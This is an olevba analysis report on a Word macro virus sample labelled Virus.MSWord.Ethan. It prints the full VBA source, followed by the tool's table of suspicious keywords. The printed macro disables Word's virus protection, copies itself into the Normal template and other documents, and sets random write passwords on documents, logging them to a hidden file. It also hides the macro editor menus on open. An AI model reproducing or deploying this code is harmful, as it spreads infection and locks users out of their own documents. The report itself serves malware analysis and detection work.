olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.do-21d5488ba3892a53c85915aa71e6dd382e13f838
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.do-21d5488ba3892a53c85915aa71e6dd382e13f838 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
sss = "Private Sub Document_Close()"
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0:  .BackgroundSave = True: End With
 ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Randomize
If Dir("c:\windows\system\vmm32\NVMB.vxd", 6) = "" Then
Open "c:\windows\system\vmm32\NVMB.vxd" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\windows\system\vmm32\NVMB.vxd", 6
End If
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sss Then
    Set t = NormalTemplate.VBProject.VBComponents.Item(1)
Else
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sss Then
    Set t = ActiveDocument.VBProject.VBComponents.Item(1)
  Else
    t = ""
End If
End If
If t <> "" Then
Open "c:\windows\system\vmm32\NVMB.vxd" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
End If
If Application.UserName = "ÍĎ ŃĎŃ" Or Application.UserName = "Ôčëčďďĺíęî" Then

Else
Set myDoc = ActiveDocument
If Month(Now()) >= 11 And Day(Now()) > 5 Then
   With Application.ActiveWindow.Document.Words.Item(25)
       .Text = Chr(13) + " With New Year   N V M B !!!  " + Chr(13)
       .Select
       .Font.Name = "Tahoma"
       .Font.Size = 16
       .Font.Animation = wdAnimationLasVegasLights
   End With
If Left(ActiveDocument.Name, 3) <> "DMB" Then
   i = Int((60 * Rnd) + 1)
   pass = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   Count = Int((10 * Rnd) + 1)
   pass = Left(pass, Count)
   Open "c:\pass.sys" For Append As #1
   Print #1, ActiveDocument.Name
   Print #1, pass
   Close #1
   myDoc.WritePassword = pass
   With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0:  .BackgroundSave = True:  End With
End If
End If
End If
 With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0:  .BackgroundSave = True:  End With
End Sub
Private Sub Document_Open()
On Error Resume Next
 With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0:  .BackgroundSave = True:  End With
Dim ee As CommandBarPopup
Set ee = Application.CommandBars("Menu Bar").Controls("&Ńĺđâčń")
ee.CommandBar.Controls("&Ěŕęđîń").Enabled = True
Dim S1 As CommandBarPopup
Set S1 = ee.CommandBar.Controls("&Ěŕęđîń")
For q = 1 To S1.Controls.Count
   If S1.CommandBar.Controls.Item(q).Caption = "&Đĺäŕęňîđ Visual Basic" Or S1.CommandBar.Controls.Item(q).Caption = "&Íŕ÷ŕňü çŕďčńü..." Or S1.CommandBar.Controls.Item(q).Caption = "&Ěŕęđîńű..." Then
      S1.CommandBar.Controls.Item(q).Visible = False
      S1.CommandBar.Controls.Item(q).Enabled = False
   End If
Next q
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
